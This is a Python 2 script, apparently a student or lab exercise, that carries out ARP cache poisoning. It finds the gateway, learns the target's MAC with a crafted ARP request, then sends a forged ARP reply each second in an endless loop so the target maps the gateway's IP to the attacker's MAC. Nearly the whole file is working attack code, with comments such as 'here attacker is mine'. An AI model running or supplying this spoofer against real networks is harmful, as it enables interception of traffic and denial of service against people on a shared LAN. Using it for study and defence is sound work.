import subprocess
import sys
import time
import socket
from uuid import getnode as get_mac

def Find_GatewayIpAddr() :
	p = subprocess.Popen('route', shell = True, stdout = subprocess.PIPE)
	data = p.communicate()
	sdata = data[0].split()
	gwIp = sdata[sdata.index('default') + 1]
	print "Gateway IP : " + gwIp
	return gwIp
	# i am trying to fing gateway information like ip

def send_reply_pkt(target_IP, target_MAC, GWip) :
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
	s.bind(('ens33', socket.SOCK_RAW))
	pkt = target_MAC + AttackerMacAddr()+ '\x08\x06'+ '\x00\x01'+ '\x08\x00'+ '\x06\x04\x00\x02'+AttackerMacAddr()+ GWip+ target_MAC
	for i in target_IP.split('.') :
		pkt = pkt + chr(int(i))
	s.send(pkt)
	#when we are supposed to send Infected Packet, this code shows us how to send infected packet

def Recovery(target_MAC, GWip) :
	sr = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
	data = sr.recvfrom(80)[0]
	sr.close()
	if data[28:38] == GWip + target_MAC :
		return 1
	return 0

def AttackerMacAddr() :
	mac = "%012x" %get_mac()
	attackerMac = ''
	for i in range(0, len(mac) / 2) :
		attackerMac = attackerMac + chr(int('0x' + mac[i * 2:i * 2 + 2], 16))
	return attackerMac
#when we want to define the value of attacker mac address. here attacker is mine!

def AttackerIpAddr() :
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("google.com", 80))
	ip = s.getsockname()[0].split('.')
	attackerMac = ''
	for i in ip :
		attackerMac = attackerMac + chr(int(i))
	s.close()
	return attackerMac
#when we want to define the value of attacker ip address. here attacker is mine!

def Find_SenderMacAddr_GW(target_ip) :
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
	sr = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
	s.bind(('ens33', socket.SOCK_RAW))
	pkt = '\xff\xff\xff\xff\xff\xff'
	pkt = pkt + AttackerMacAddr()
	pkt = pkt + '\x08\x06'
	pkt = pkt + '\x00\x01'
	pkt = pkt + '\x08\x00'
	pkt = pkt + '\x06\x04\x00\x01'
	pkt = pkt + AttackerMacAddr()
	pkt = pkt + AttackerIpAddr()
	pkt = pkt + '\x00\x00\x00\x00\x00\x00'
	for i in target_ip.split('.') :
		pkt = pkt + chr(int(i))
	pkt = pkt + '\x00' * 20
	print "Now Attacker is sending ARP Request Packet"
	s.send(pkt)
	data = sr.recvfrom(80)[0]
	print "Now Sender is receiving ARP Reply Packet"
	pos = 1
	target_MAC = ''
	if data[12] == '\x08' and data[13] == '\x06' and data[20] == '\x00' and data[21] == '\x02' :
		for i in range(6, 12) :
			target_MAC = target_MAC + data[i]

		global find
		find = 0
	else :
		print "Fail, Retry"
	s.close()
	sr.close()
	return target_MAC

if len(sys.argv) != 2 :
	#Usage : arp.py gateway_ip
	exit()

global find
find = 1

GWip = ''
for i in Find_GatewayIpAddr().split('.') :
	GWip = GWip + chr(int(i))

while find :
	target_MAC = Find_SenderMacAddr_GW(sys.argv[1])

print "Now we are finding gateway mac address (targetMacAddr) : " + "%02x:%02x:%02x:%02x:%02x:%02x" % (ord(target_MAC[0]), ord(target_MAC[1]), ord(target_MAC[2]), ord(target_MAC[3]), ord(target_MAC[4]), ord(target_MAC[5]))

send_reply_pkt(sys.argv[1], target_MAC, GWip)

check_recovery = 0
sr = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))

while True :
	send_reply_pkt(sys.argv[1], target_MAC, GWip)
	time.sleep(1)
	print " Now we are sending i time reply packet per 1 sec" 

